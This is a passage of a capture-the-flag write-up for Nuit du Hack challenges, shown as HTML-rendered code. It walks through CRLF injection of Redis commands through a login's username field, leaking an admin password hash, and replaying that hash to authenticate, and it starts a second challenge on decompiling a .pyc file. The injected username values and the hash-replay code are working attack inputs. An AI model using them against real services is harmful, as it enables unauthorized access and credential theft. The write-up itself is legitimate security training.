&lt;span class="code-line"&gt;    &lt;span class="n"&gt;scc&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;scc&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;scc&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_response&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;scc&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We execute the code:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c"&gt;spl3en@box:~$ python SecureAuthClient&lt;/span&gt;&lt;span class="nt"&gt;.&lt;/span&gt;&lt;span class="c"&gt;py&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;[&lt;/span&gt;&lt;span class="c"&gt;~&lt;/span&gt;&lt;span class="k"&gt;]&lt;/span&gt;&lt;span class="c"&gt; Server sent challenge : gOg0gySNyDbKCKD5oT6SLEdG4fEgkNXntk5uQ1m1XtZzIvMT62bcqMgmB6ei5HVI !&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;+&lt;/span&gt;&lt;span class="k"&gt;]&lt;/span&gt;&lt;span class="c"&gt; Auth data : AUTH username|7b98c028fc42ee7bc830948b036571f8327279b6929b4f598891ed608edbfbd9&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;[&lt;/span&gt;&lt;span class="c"&gt;~&lt;/span&gt;&lt;span class="k"&gt;]&lt;/span&gt;&lt;span class="c"&gt; Sending auth packet&lt;/span&gt;&lt;span class="nt"&gt;...&lt;/span&gt;&lt;span class="c"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;[&lt;/span&gt;&lt;span class="c"&gt;!&lt;/span&gt;&lt;span class="k"&gt;]&lt;/span&gt;&lt;span class="c"&gt; Authentification Error : Invalid username&lt;/span&gt;&lt;span class="nt"&gt;.&lt;/span&gt;&lt;span class="c"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;-&lt;/span&gt;&lt;span class="k"&gt;]&lt;/span&gt;&lt;span class="c"&gt; Bad password or authentification error&lt;/span&gt;&lt;span class="nt"&gt;...&lt;/span&gt;&lt;span class="c"&gt; !&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id="admin"&gt;admin&lt;/h3&gt;
&lt;p&gt;By replacing &lt;code&gt;username&lt;/code&gt; by &lt;code&gt;admin&lt;/code&gt; we got a different message allowing us to
think that we got the right user:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c"&gt;spl3en@box:~$ python SecureAuthClient&lt;/span&gt;&lt;span class="nt"&gt;.&lt;/span&gt;&lt;span class="c"&gt;py&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;[&lt;/span&gt;&lt;span class="c"&gt;~&lt;/span&gt;&lt;span class="k"&gt;]&lt;/span&gt;&lt;span class="c"&gt; Server sent challenge : GRlJD0cTH7RQFPQ5TUNQRQZVmLrxejFNsDPYFF0LWZKvBJLvFwAvN0YDPvU9AMGV !&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;+&lt;/span&gt;&lt;span class="k"&gt;]&lt;/span&gt;&lt;span class="c"&gt; Auth data : AUTH admin|febb7f8cec097ba5636da95ded1b019030483436385584297bbf64e1bf828acb&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;[&lt;/span&gt;&lt;span class="c"&gt;~&lt;/span&gt;&lt;span class="k"&gt;]&lt;/span&gt;&lt;span class="c"&gt; Sending auth packet&lt;/span&gt;&lt;span class="nt"&gt;...&lt;/span&gt;&lt;span class="c"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;+&lt;/span&gt;&lt;span class="k"&gt;]&lt;/span&gt;&lt;span class="c"&gt; Welcome Administrator we are verifying your password&lt;/span&gt;&lt;span class="nt"&gt;...&lt;/span&gt;&lt;span class="c"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;-&lt;/span&gt;&lt;span class="k"&gt;]&lt;/span&gt;&lt;span class="c"&gt; Bad password or authentification error&lt;/span&gt;&lt;span class="nt"&gt;...&lt;/span&gt;&lt;span class="c"&gt; !&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id="errors"&gt;Errors&lt;/h3&gt;
&lt;p&gt;Moreover, when playing with the username value, for instance by putting
&lt;code&gt;username"&lt;/code&gt; we got the following message:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c"&gt;spl3en@box:~$ python SecureAuthClient&lt;/span&gt;&lt;span class="nt"&gt;.&lt;/span&gt;&lt;span class="c"&gt;py&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;[&lt;/span&gt;&lt;span class="c"&gt;~&lt;/span&gt;&lt;span class="k"&gt;]&lt;/span&gt;&lt;span class="c"&gt; Server sent challenge : uJ2A8UE1WMwYCgWDmOMZSVirPWQoxhWAVeECAwWOVUxXD9q6qqvqGPSpolKr5KX1 !&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;+&lt;/span&gt;&lt;span class="k"&gt;]&lt;/span&gt;&lt;span class="c"&gt; Auth data : AUTH username&amp;#39;|a932aed6531ebf37074484e10611499007dadd6c42f69649a242302c09245792&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;[&lt;/span&gt;&lt;span class="c"&gt;~&lt;/span&gt;&lt;span class="k"&gt;]&lt;/span&gt;&lt;span class="c"&gt; Sending auth packet&lt;/span&gt;&lt;span class="nt"&gt;...&lt;/span&gt;&lt;span class="c"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;[&lt;/span&gt;&lt;span class="c"&gt;!&lt;/span&gt;&lt;span class="k"&gt;]&lt;/span&gt;&lt;span class="c"&gt; Authentification Error : Valid response code but no user data received : &lt;/span&gt;&lt;span class="nb"&gt;-&lt;/span&gt;&lt;span class="c"&gt;ERR Protocol error: unbalanced quotes in request&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;-&lt;/span&gt;&lt;span class="k"&gt;]&lt;/span&gt;&lt;span class="c"&gt; Bad password or authentification error&lt;/span&gt;&lt;span class="nt"&gt;...&lt;/span&gt;&lt;span class="c"&gt; !&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id="redis"&gt;Redis&lt;/h3&gt;
&lt;p&gt;The error &lt;code&gt;unbalanced quotes in request&lt;/code&gt; seems to be from a Redis server, a
NoSQL engine. We can see this precise error in the
&lt;a href="http://download.redis.io/redis-stable/src/networking.c"&gt;&lt;code&gt;networking.c&lt;/code&gt;&lt;/a&gt; file
of the project.&lt;/p&gt;
&lt;p&gt;We replace the username with &lt;code&gt;admin\x0A\x0D&lt;/code&gt; in order to finish the command and
obtain :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c"&gt;spl3en@box:~$ python SecureAuthClient&lt;/span&gt;&lt;span class="nt"&gt;.&lt;/span&gt;&lt;span class="c"&gt;py&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;[&lt;/span&gt;&lt;span class="c"&gt;~&lt;/span&gt;&lt;span class="k"&gt;]&lt;/span&gt;&lt;span class="c"&gt; Server sent challenge : OFJUOFLbDdR49FHeNMUH4FX7VFIUPxiASDKIaXpZvtIELU3Yo333ICcUmIZFfVWB !&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;+&lt;/span&gt;&lt;span class="k"&gt;]&lt;/span&gt;&lt;span class="c"&gt; Auth data : AUTH username |e72fd1858578774bfbee00196992db55f7697833746053a2390a73f4616c60da&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;[&lt;/span&gt;&lt;span class="c"&gt;~&lt;/span&gt;&lt;span class="k"&gt;]&lt;/span&gt;&lt;span class="c"&gt; Sending auth packet&lt;/span&gt;&lt;span class="nt"&gt;...&lt;/span&gt;&lt;span class="c"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;+&lt;/span&gt;&lt;span class="k"&gt;]&lt;/span&gt;&lt;span class="c"&gt; Welcome &lt;/span&gt;&lt;span class="nb"&gt;-&lt;/span&gt;&lt;span class="c"&gt;ERR unknown command &amp;#39;:name&amp;#39; we are verifying your password&lt;/span&gt;&lt;span class="nt"&gt;...&lt;/span&gt;&lt;span class="c"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;-&lt;/span&gt;&lt;span class="k"&gt;]&lt;/span&gt;&lt;span class="c"&gt; Bad password or authentification error&lt;/span&gt;&lt;span class="nt"&gt;...&lt;/span&gt;&lt;span class="c"&gt; !&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We notice the prefix &lt;code&gt;:name&lt;/code&gt; which have been interpreted as a second command.&lt;/p&gt;
&lt;h3 id="command-injection"&gt;Command injection&lt;/h3&gt;
&lt;p&gt;We try to inject &lt;a href="http://redis.io/commands"&gt;Redis commands&lt;/a&gt; like &lt;code&gt;INFO&lt;/code&gt; by
replacing the username with &lt;code&gt;admin\x0A\x0DINFO\x0A\x0D&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c"&gt;spl3en@box:~$ python SecureAuthClient&lt;/span&gt;&lt;span class="nt"&gt;.&lt;/span&gt;&lt;span class="c"&gt;py&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;[&lt;/span&gt;&lt;span class="c"&gt;~&lt;/span&gt;&lt;span class="k"&gt;]&lt;/span&gt;&lt;span class="c"&gt; Server sent challenge : JrLFTYYrDxYibypIBzkdmALAzDCoYe9olBMEZ2OXEDuqsrFFISLzLhWMkeFOdRCB !&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;+&lt;/span&gt;&lt;span class="k"&gt;]&lt;/span&gt;&lt;span class="c"&gt; Auth data : AUTH admin&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c"&gt;INFO&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c"&gt;|30247cdea2397657332d6f35b4c2a4340b83e3a842a17119704f31185a41cbe3&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;[&lt;/span&gt;&lt;span class="c"&gt;~&lt;/span&gt;&lt;span class="k"&gt;]&lt;/span&gt;&lt;span class="c"&gt; Sending auth packet&lt;/span&gt;&lt;span class="nt"&gt;...&lt;/span&gt;&lt;span class="c"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;+&lt;/span&gt;&lt;span class="k"&gt;]&lt;/span&gt;&lt;span class="c"&gt; Welcome &lt;/span&gt;&lt;span class="nb"&gt;-&lt;/span&gt;&lt;span class="c"&gt;ERR unknown command &amp;#39;INFO&amp;#39; we are verifying your password&lt;/span&gt;&lt;span class="nt"&gt;...&lt;/span&gt;&lt;span class="c"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;-&lt;/span&gt;&lt;span class="k"&gt;]&lt;/span&gt;&lt;span class="c"&gt; Bad password or authentification error&lt;/span&gt;&lt;span class="nt"&gt;...&lt;/span&gt;&lt;span class="c"&gt; !&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code&gt;INFO&lt;/code&gt; commend is not recognize. After several tests, we see that all
commands but &lt;code&gt;GET&lt;/code&gt; seems filtrated. We suppose that the one used to get the
username and the password in the NoSQL database. With &lt;/p&gt;
&lt;p&gt;The requests on the server should be something like:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;username = GET &amp;lt;user&amp;gt;:name&lt;/span&gt;
&lt;span class="code-line"&gt;password = GET &amp;lt;user&amp;gt;:password&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We try to inject &lt;code&gt;admin:password\x0A\x0D&lt;/code&gt; in the username, that will give us:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;username = GET admin:password\x0A\x0D:name&lt;/span&gt;
&lt;span class="code-line"&gt;password = GET admin:password\x0A\x0D:password&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;(The name and password at the end of each line would not be interpreted).&lt;/p&gt;
&lt;p&gt;We execute the program with &lt;code&gt;admin:password\x0A\x0D&lt;/code&gt; as a username:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c"&gt;spl3en@box:~$ python SecureAuthClient&lt;/span&gt;&lt;span class="nt"&gt;.&lt;/span&gt;&lt;span class="c"&gt;py&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;[&lt;/span&gt;&lt;span class="c"&gt;~&lt;/span&gt;&lt;span class="k"&gt;]&lt;/span&gt;&lt;span class="c"&gt; Server sent challenge : DsHn1UJH7LjPSpVOIuZwh7QUgEZ1qGXnK8sHxBYnSTsaWNdVYDvHG5UCPTrvL2AJ !&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;+&lt;/span&gt;&lt;span class="k"&gt;]&lt;/span&gt;&lt;span class="c"&gt; Auth data : AUTH admin:password&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c"&gt;|606611cc808eabd5e38bed8e21360b52127f3e2cecbf02413c3da90fa43c71a3&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;[&lt;/span&gt;&lt;span class="c"&gt;~&lt;/span&gt;&lt;span class="k"&gt;]&lt;/span&gt;&lt;span class="c"&gt; Sending auth packet&lt;/span&gt;&lt;span class="nt"&gt;...&lt;/span&gt;&lt;span class="c"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;+&lt;/span&gt;&lt;span class="k"&gt;]&lt;/span&gt;&lt;span class="c"&gt; Welcome 837a135ad3ccb1978f169aa62a62a028b76ec42b2284791bd4703421ec050529 we are verifying your password&lt;/span&gt;&lt;span class="nt"&gt;...&lt;/span&gt;&lt;span class="c"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;-&lt;/span&gt;&lt;span class="k"&gt;]&lt;/span&gt;&lt;span class="c"&gt; Bad password or authentification error&lt;/span&gt;&lt;span class="nt"&gt;...&lt;/span&gt;&lt;span class="c"&gt; !&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;As excepted the server show us the username that we replace by its hashed
password. We get the &lt;code&gt;sha256(admin_passwd)&lt;/code&gt;:
&lt;code&gt;837a135ad3ccb1978f169aa62a62a028b76ec42b2284791bd4703421ec050529&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;We replace the corresponding python code to directly send the hash:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;packet&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;AUTH &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;|&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sha256&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sha256&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;authtoken&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;challenge&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Become:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;packet&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;AUTH &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;|&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sha256&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;837a135ad3ccb1978f169aa62a62a028b76ec42b2284791bd4703421ec050529&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;challenge&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We execute the script:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;spl3en&lt;/span&gt;&lt;span class="nv"&gt;@box&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;python&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;SecureAuthClient&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;py&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;~&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Server&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;sent&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;challenge&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;elQQpNHPDlDk1FO9RUiqDfUyUBRpFGMJ5NuBkGTGnGVYW9SCRluSYlcNQnJYkSHP&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;+&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Auth&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;data&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;AUTH&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;admin&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="n"&gt;baf1cc43bbe6316ed5959cd8efd2fd8f23d9bae441d4a8134277cd973fcaec4&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;~&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Sending&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;auth&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;packet&lt;/span&gt;&lt;span class="p"&gt;...&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;+&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Welcome&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;837&lt;/span&gt;&lt;span class="n"&gt;a135ad3ccb1978f169aa62a62a028b76ec42b2284791bd4703421ec050529&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;we&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;are&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;verifying&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;your&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;...&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;+&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Congrats&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;The&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;flag&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;is&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;INSERT_FUNNY_QUOTE_HERE&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Flag: *INSERT_FUNNY_QUOTE_HERE*&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id="updator"&gt;Updator&lt;/h1&gt;
&lt;p&gt;Exploit  |  200 points  |  http://quals.nuitduhack.com/challenges/view/9&lt;/p&gt;
&lt;p&gt;http://updator.challs.nuitduhack.com/&lt;/p&gt;
&lt;h2 id="statement_3"&gt;Statement&lt;/h2&gt;
&lt;p&gt;*Unhackable : "Not hackable; that cannot be hacked or broken into."&lt;/p&gt;
&lt;p&gt;We manage updates and thus have fixes, this is not a PS3 as it is unhackable…
or is it?*&lt;/p&gt;
&lt;h2 id="challenge_3"&gt;Challenge&lt;/h2&gt;
&lt;p&gt;The website is a simple page with a login interface for witch we do not have any
credentials and a &lt;strong&gt;Update&lt;/strong&gt; button.
When clicking on the button we got the following message from the page
http://updator.challs.nuitduhack.com/update.py:
&lt;em&gt;The update managing system is still under construction but will be available soon.&lt;/em&gt;&lt;/p&gt;
&lt;h3 id="robotstxt"&gt;robots.txt&lt;/h3&gt;
&lt;p&gt;The file &lt;code&gt;robots.txt&lt;/code&gt; reveal the folder temp/:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;Disallow&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;temp&lt;/span&gt;&lt;span class="o"&gt;/*&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;In this folder we found a file &lt;code&gt;log.py.encrypted&lt;/code&gt;. How can we decipher it ?&lt;/p&gt;
&lt;h3 id="pyc"&gt;pyc&lt;/h3&gt;
&lt;p&gt;The &lt;strong&gt;Update&lt;/strong&gt; button call a &lt;code&gt;update.py&lt;/code&gt; file therefor we can try for the
compiled version of it with the .pyc extension as confirmed by the page
http://updator.challs.nuitduhack.com/update.pyc&lt;/p&gt;
&lt;p&gt;We must decompile this file, we will use
&lt;a href="https://github.com/wibiti/uncompyle2"&gt;uncompyle2&lt;/a&gt;. The output is the following
python program:&lt;/p&gt;
